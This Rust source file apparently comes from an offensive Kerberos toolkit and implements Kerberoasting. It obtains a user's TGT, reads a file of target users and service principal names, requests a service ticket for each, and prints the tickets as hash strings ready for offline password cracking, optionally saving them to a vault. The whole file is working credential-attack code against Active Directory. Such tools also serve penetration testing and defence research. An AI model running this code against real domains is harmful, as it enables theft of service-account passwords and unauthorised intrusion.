use crate::communication::KdcComm;
use crate::core::forge;
use crate::core::CredFormat;
use crate::core::KrbUser;
use crate::core::Vault;
use crate::core::{get_user_tgt, request_regular_tgs};
use crate::core::{tgs_to_crack_string, CrackFormat};
use crate::error::Result;
use crate::utils;
use kerberos_asn1::PrincipalName;
use kerberos_crypto::Key;
use log::{info, warn};

struct KerberoastService {
    user: KrbUser,
    service: Option<String>,
}

impl KerberoastService {
    fn new(user: KrbUser, service: Option<String>) -> Self {
        return Self { user, service };
    }

    fn service(&self) -> PrincipalName {
        match &self.service {
            None => forge::new_nt_enterprise(&self.user),
            Some(s) => forge::new_nt_srv_inst(s),
        }
    }
}

pub fn kerberoast(
    user: KrbUser,
    user_services_file: String,
    in_vault: &mut dyn Vault,
    out_vault: Option<&dyn Vault>,
    user_key: Option<&Key>,
    cred_format: CredFormat,
    crack_format: CrackFormat,
    etype: Option<i32>,
    mut kdccomm: KdcComm,
) -> Result<()> {
    let krbts_srvs = parse_kerberoast_file(&user_services_file, &user.realm)?;

    let channel = kdccomm.create_channel(&user.realm)?;
    let tgt = get_user_tgt(user.clone(), user_key, etype, in_vault, &*channel)?;

    let mut tickets = in_vault.dump()?;

    for krbst_srv in krbts_srvs {
        let service = krbst_srv.service();

        match request_regular_tgs(
            user.clone(),
            service.clone(),
            tgt.clone(),
            etype.map(|e| vec![e]),
            &mut kdccomm,
        ) {
            Err(err) => {
                warn!(
                    "Error asking TGS for {} {}: {}",
                    &krbst_srv.user,
                    &service.to_string(),
                    err
                );
            }
            Ok(tgs) => {
                let crack_str = tgs_to_crack_string(
                    &krbst_srv.user.name,
                    &service.to_string(),
                    &tgs.ticket,
                    crack_format,
                );
                println!("{}", crack_str);
                tickets.push(tgs);
            }
        }
    }

    if let Some(out_vault) = out_vault {
        info!("Save {} TGSs in {}", user, out_vault.id());
        out_vault.save_as(tickets, cred_format)?;
    }
    return Ok(());
}

const SEPARATOR: &'static str = ":";

/// Parse a line that specifies a service to be kerberoasted.
/// The line must include an user and optionally an SPN. The following formats
/// are supported:
/// * `user`
/// * `domain/user`
/// * `user:spn`
/// * `domain/user:spn`
///
fn parse_kerberoast_service(
    line: &str,
    default_realm: &str,
) -> Result<KerberoastService> {
    let mut parts: Vec<&str> = line.split(SEPARATOR).collect();

    let user_str = parts.remove(0);

    if user_str.is_empty() {
        return Err(format!("No user"))?;
    }

    let user_parts: Vec<&str> =
        user_str.split(|c| ['/', '\\'].contains(&c)).collect();

    let user = match user_parts.len() {
        1 => KrbUser::new(user_parts[0].to_string(), default_realm.to_string()),
        2 => {
            if user_parts[0].is_empty() {
                return Err(format!("Empty domain"))?;
            }

            if user_parts[1].is_empty() {
                return Err(format!("Empty user"))?;
            }
            KrbUser::new(user_parts[1].to_string(), user_parts[0].to_string())
        }
        _ => {
            return Err(format!(
                "Invalid user '{}', it must be <domain>/<username>",
                parts[0]
            ))?;
        }
    };

    if parts.is_empty() {
        return Ok(KerberoastService::new(user, None));
    }

    let spn = parts.join(SEPARATOR);

    return Ok(KerberoastService::new(user, Some(spn)));
}

/// Parse a file that includes services to be kerberoasted.
fn parse_kerberoast_file(
    filename: &str,
    default_realm: &str,
) -> Result<Vec<KerberoastService>> {
    let fr = utils::new_lines_reader(&filename)?;

    let mut services = Vec::new();
    for line in fr.lines() {
        let serv =
            parse_kerberoast_service(&line, default_realm).map_err(|e| {
                format!("Invalid line '{}' of '{}': {}", line, &filename, e)
            })?;
        services.push(serv);
    }

    return Ok(services);
}
